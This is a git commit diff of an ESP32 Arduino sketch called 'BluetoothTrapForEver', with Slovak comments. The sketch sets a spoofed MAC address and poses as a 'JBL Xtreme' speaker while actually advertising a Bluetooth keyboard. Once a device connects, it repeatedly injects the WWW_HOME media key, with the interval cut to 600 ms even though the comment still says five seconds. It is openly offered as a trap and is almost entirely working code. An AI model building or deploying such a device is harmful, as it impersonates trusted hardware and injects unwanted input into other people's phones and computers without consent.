6f113d1174efa6f7d30adb40663ca7d3f80c2d41
Fattcat - but not fat cat <109801079+Fattcat@users.noreply.github.com>
2025-01-16 21:13:23 +0100

    Update BluetoothTrapForEver.ino

--- BluetoothTrapForEver.ino
+++ BluetoothTrapForEver.ino
@@ -1,32 +1,14 @@
-#include <BLEDevice.h>
-#include <BLEServer.h>
-#include <BLEHIDDevice.h>
-#include <HIDTypes.h>
-#include <BLEKeyboard.h>
-
-// Vlastná MAC adresa
-const uint8_t customMacAddr[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
+#include <BleKeyboard.h>
 
 // BLE Keyboard
-BLEKeyboard bleKeyboard("Pro Speaker", "Custom Low Paid Manufacturer", 100);
+BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 100);
 
-bool deviceConnected = false;
-
-// Callback pre detekciu pripojenia
-class ServerCallbacks : public BLEServerCallbacks {
-  void onConnect(BLEServer* pServer) {
-    deviceConnected = true;
-    Serial.println("Zariadenie pripojené");
-  }
-
-  void onDisconnect(BLEServer* pServer) {
-    deviceConnected = false;
-    Serial.println("Zariadenie odpojené");
-  }
-}
+// Vlastná MAC adresa
+const uint8_t customMacAddr[] = {0xF4, 0xF3, 0xAA, 0x07, 0xE4, 0xF2};
 
 void setup() {
   Serial.begin(115200);
+  Serial.println("Starting BLE work!");
 
   // Nastavenie vlastnej MAC adresy
   esp_base_mac_addr_set(customMacAddr);
@@ -38,19 +20,22 @@ void setup() {
   Serial.println();
 
   // Inicializácia BLE Keyboard
-  BLEDevice::init("JBL Xtreme");
-  BLEServer* pServer = BLEDevice::createServer();
-  pServer->setCallbacks(new ServerCallbacks());
-
   bleKeyboard.begin();
 }
 
 void loop() {
-  if (deviceConnected && bleKeyboard.isConnected()) {
-    // Odoslanie WWW_HOME mediálneho tlačidla
+  // Skontrolujeme, či je zariadenie pripojené
+  if (bleKeyboard.isConnected()) {
+    Serial.println("BLE zariadenie pripojené!");
+
+    // Odoslanie mediálneho tlačidla WWW_HOME
     Serial.println("Odosielam tlačidlo: WWW_HOME");
     bleKeyboard.write(KEY_MEDIA_WWW_HOME);
-    delay(5000); // Odoslanie každých 5 sekúnd
+
+    // Počkajte 5 sekúnd pred ďalším odoslaním
+    delay(600);
+  } else {
+    Serial.println("Čakám na pripojenie BLE zariadenia...");
   }
 
   delay(100);
